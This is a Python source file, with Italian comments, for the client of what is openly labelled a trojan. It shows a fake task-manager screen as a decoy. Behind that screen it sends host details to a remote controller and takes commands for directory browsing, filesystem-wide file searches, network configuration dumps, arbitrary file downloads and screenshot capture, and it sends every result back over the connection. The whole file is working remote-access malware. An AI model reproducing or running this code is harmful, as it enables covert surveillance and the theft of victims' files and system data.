from generalClient import *
from connectionClient import *
import os
import sys
import time
import psutil
import pyautogui
import traceback
import subprocess


# OK mando informazioni so
def sendInfo(client):
    mando = 1
    while mando == 1:
        try:
            infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd()
            client.send((str((len(infos)))).encode(FORMAT))
            time.sleep(2)
            client.send(((infos)).encode(FORMAT))
            mando = 0
        except Exception:
            mando = 0
            raise Exception

# OK comportamento da trojan
def trojanBehaviour():
    while True:
        try:
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            processes_count = 0
            print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
            print("              --     Task manager: Current state of usage      --\n\n")
            # facciamo un display a video dell'utilizzo
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),
                                                                                                              int(ram),
                                                                                                              int(disk),
                                                                                                              processes_count))
            print("              --------------------------------------------------------- ")
            time.sleep(1)
            clearScreen()
        except:
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("              --------------------------------------------------------- ")


# OK creazione file con tutti i tipi di tipologia
def filespath(tipologia, client):
    time.sleep(4)

    allType = ""
    listaType = tipologia.split()
    result = [""]
    path="null"
    counter_elemets=0

    if platform.system() == "Windows":
        path = "C:\\Users"
    elif platform.system() == "Darwin":
        path = "/Users/"
    else:
        path = "/"

    for n in range(len(listaType)):

        tipologia = listaType[n]
        result.append("\n\nLista dei risultati per estensione: " + tipologia + "\n\n")

        if tipologia == "*":
            allType=allType+" "+tipologia
            for cartella, sottocartelle, file in os.walk(path):
                for item in file:
                    result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")

        elif tipologia[0:1]==".":
            allType=allType+" "+tipologia
            for cartella, sottocartelle, file in os.walk(path):
                for item in file:
                    if item.endswith(tipologia):
                        counter_elemets += 1
                        result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")

    result.append("\n----Trovati "+str(counter_elemets)+" elementi.")
    result.append("\n### TROVATI TUTTI I FILE CON ESTENSIONE " + allType + "###\n\n")
    result = ''.join(result)

    try:
        encode=result.encode(FORMAT)
        x=1024
        y=x+1024

        line = encode[0:1024]
        client.send(line)
        while (line):
            line = encode[x:y]
            client.send(line)
            x = x+1024
            y = x+1024

        time.sleep(2)
        client.send(("[END]").encode(FORMAT))

    except:
        client.send(("[ERROR]").encode(FORMAT))

    time.sleep(5)

# OK cerco tutti i file con estensione indicata in un certo path
def find(comando, client):
    time.sleep(4)
    counter_punti=0
    counter_spazi=0
    inizio_ext=0
    fine_ext=0
    inizio_path=0
    counter_elemets=0

    specificlist = ["\nRisultati "+comando+":\n"]

    for element in range(0, len(comando)):
        if comando[element] == ".":
            counter_punti += 1
            if counter_punti == 1:
                inizio_ext = element
            elif counter_punti == 2:
                inizio_path = element
        if comando[element] == " ":
            counter_spazi += 1
            if counter_spazi == 2:
                fine_ext = element
                inizio_path = element + 1

    estensione=comando[inizio_ext:fine_ext]
    path=comando[inizio_path:]
    genericlist=os.listdir(path)
    for item in genericlist:
        if item.endswith(estensione):
            counter_elemets += 1
            specificlist.append("-: " + item + "\n")

    specificlist.append("\nNumero di elementi trovati: " + str(counter_elemets))
    data = ''.join(specificlist)

    try:
        filesize = sys.getsizeof(data)
        client.send((str(filesize)).encode(FORMAT))
        time.sleep(5)
        client.send((data).encode(FORMAT))
        time.sleep(1)
    except Exception:
        traceback.print_exc()
        raise Exception



# funzione di remote control
def openRemoteControl(client):
    comando = "null"
    while comando != "exit":
        try:
            pathSend="[PATH]"+os.getcwd()
            client.send((pathSend).encode(FORMAT))
            comando = client.recv(1024).decode(FORMAT)
            time.sleep(0.5)

            if comando[0:2] == "cd":
                match= regexcheck_cd(comando)

                if match:
                    os.chdir(comando[3:])

            elif comando[0:2] == "ls":
                match=False
                match=regexcheck_ls(comando)
                try:
                    if match:
                        if len(comando) == 2:
                            listdir = os.listdir()
                            lista = []
                            for item in listdir:
                                lista.append("-: " + item + "\n")

                            data = ''.join(lista)
                            client.send((data).encode(FORMAT))
                            time.sleep(1.5)
                        else:
                            comandorisolto = comando.split()
                            path = comandorisolto[1]
                            listdir = os.listdir(path)
                            lista = []
                            for item in listdir:
                                lista.append("-: " + item + "\n")

                            data = ''.join(lista)
                            client.send((data).encode(FORMAT))
                            time.sleep(1.5)
                except:
                    client.send(("[ERROR]").encode(FORMAT))

            elif comando[0:4] == "rete" or comando[0:7] == "network":
                try:
                    if platform.system() == "Windows":
                        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8')
                        result = ["### Dati configurazione di rete ###\n"]
                        for item in data:
                            result.append(item)

                        result = ''.join(result)
                        client.send(((result)).encode())
                        time.sleep(1.5)

                    elif platform.system() == "Darwin" or "Linux":
                        data = subprocess.check_output(['ifconfig', '-a']).decode('utf-8')
                        result = ["### Dati configurazione di rete ###\n"]
                        for item in data:
                            result.append(item)

                        result = ''.join(result)
                        client.send(((result)).encode())
                        time.sleep(1.5)

                except Exception:
                    traceback.print_exc()
                    client.send(("[ERROR]").encode(FORMAT))

            elif comando == "pwd":
                client.send((os.getcwd()).encode(FORMAT))

            elif comando[0:9] == "filespath":
                estensione = comando[10:]
                try:
                    filespath(estensione, client)
                except:
                    pass

            elif comando[0:4] == "find":
                if regexcheck_find(comando) == True:
                    try:
                        find(comando, client)
                        time.sleep(2)
                    except:
                        traceback.print_exc()

            elif comando == "info":
                infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                client.send(((infos)).encode(FORMAT))

            elif comando[0:8] == "download":
                try:
                    filename = comando[10:len(comando) - 1]
                    filesize = os.path.getsize(filename)
                    if filesize<=0:
                        raise Exception
                    else:
                        with open(filename, 'rb') as f:
                            time.sleep(4)
                            line = f.read(1024)
                            client.send(line)
                            while (line):
                                line = f.read(1024)
                                client.send(line)

                            time.sleep(2)
                            client.send(("[END]").encode(FORMAT))
                            f.close()
                except:
                    client.send(("[ERROR]").encode(FORMAT))

                time.sleep(3)

            elif comando =="screenshot":
                myScreenshot = pyautogui.screenshot()
                if platform.system() == "Windows":
                    myScreenshot.save(os.getcwd() + "\screen.png")
                elif platform.system() == "Darwin":
                    myScreenshot.save(os.getcwd() + "/screen.png")
                else:
                    myScreenshot.save(os.getcwd() + "/screen.png")

                try:
                    filename = "screen.png"
                    filesize = os.path.getsize(filename)
                    if filesize<=0:
                        raise Exception
                    else:
                        with open(filename, 'rb') as f:
                            time.sleep(4)
                            line = f.read(1024)
                            client.send(line)
                            while(line):
                                line = f.read(1024)
                                client.send(line)

                            time.sleep(2)
                            client.send(("[END]").encode(FORMAT))
                            f.close()
                except:
                    traceback.print_exc()
                    client.send(("[ERROR]").encode(FORMAT))

                os.remove("screen.png")
                time.sleep(5)
            else:
                pass

        except Exception as e:
            #traceback.print_exc()
            if e.__class__.__name__== "ConnectionResetError":
                comando="exit"
            else:
                comando="null"
